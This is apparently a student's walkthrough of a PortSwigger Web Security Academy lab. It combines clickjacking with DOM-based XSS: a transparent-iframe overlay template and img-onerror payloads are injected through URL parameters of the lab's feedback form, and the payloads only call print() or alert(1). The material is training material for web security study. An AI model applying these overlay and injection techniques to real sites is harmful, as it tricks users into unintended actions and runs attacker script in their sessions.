# Exploiting clickjacking vulnerability to trigger DOM-based XSS

## his lab contains an [XSS](https://portswigger.net/web-security/cross-site-scripting) vulnerability that is triggered by a click. Construct a [clickjacking attack](https://portswigger.net/web-security/clickjacking) that fools the user into clicking the "Click me" button to call the `print()` function.

### Note: DOM stored attack

eg:1
`<img src=1 onerror=alert(1)>`
eg:2
`<><img src=1 onerror=alert(1)>`

change to print()
`<img src=1 onerror=print()>`

test with alert(1) once it will pop up alert then change to print() lab solving
test the below script into w3school

```html
<style>
  iframe {
    position: relative;
    width: 700px;
    height: 7000px;
    opacity: 0.1;
    z-index: 2;
  }
  div {
    position: absolute;
    top: 795px;
    left: 68px;
    z-index: 1;
  }
</style>
<div>Click me</div>
<iframe
  src="https://0a0500fc033ea678803f121800ee00e6.web-security-academy.net/feedback"
></iframe>
```

submit form and intercept into burpsute change request method

```javascript
GET /feedback/submit?csrf=S5g89CgcTy1KMizUyEFm2gld7i1fANSY&name=hello&email=hello%40pk.com&subject=fhh&message=clkjcl
```

### step1

```html
<style>
  iframe {
    position: relative;
    width: 700px;
    height: 7000px;
    opacity: 0.1;
    z-index: 2;
  }
  div {
    position: absolute;
    top: 795px;
    left: 68px;
    z-index: 1;
  }
</style>
<div>Click me</div>
<iframe
  src="https://0a0500fc033ea678803f121800ee00e6.web-security-academy.net/feedback?name=hello&email=hello%40pk.com&subject=fhh&message=clkjcl"
></iframe>
```

### step2

`set name=<><img src=1 onerror=print()>`

### step3

```html
<style>
  iframe {
    position: relative;
    width: 700px;
    height: 700px;
    opacity: 0.1;
    z-index: 2;
  }
  div {
    position: absolute;
    top: 795px;
    left: 68px;
    z-index: 1;
  }
</style>
<div>Click me</div>
<iframe
  src="https://0a0500fc033ea678803f121800ee00e6.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hello@0pk.com&subject=fhh&message=clkjcl"
></iframe>
```
